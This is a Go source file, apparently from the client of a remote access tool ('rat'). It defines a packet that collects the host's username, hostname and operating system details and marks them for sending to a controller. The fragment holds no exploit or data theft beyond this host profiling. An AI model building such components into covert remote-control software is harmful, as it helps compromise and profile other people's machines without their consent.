package main

import (
	"oslib"
	"rat/client/computer"
	"rat/shared/network/header"
)

type ComputerInfoPacket struct {
	Username                   string `network:"send"`
	Hostname                   string `network:"send"`
	OperatingSystemName        string `network:"send"`
	OperatingSystemDisplayName string `network:"send"`
}

func (packet ComputerInfoPacket) Header() header.PacketHeader {
	return header.ComputerInfoHeader
}

func (packet *ComputerInfoPacket) Init() {
	u := computer.GetComputerInformation()

	packet.Username = u.Username
	packet.Hostname = u.Hostname
	packet.OperatingSystemName = oslib.Name
	packet.OperatingSystemDisplayName = oslib.GetDisplay()
}
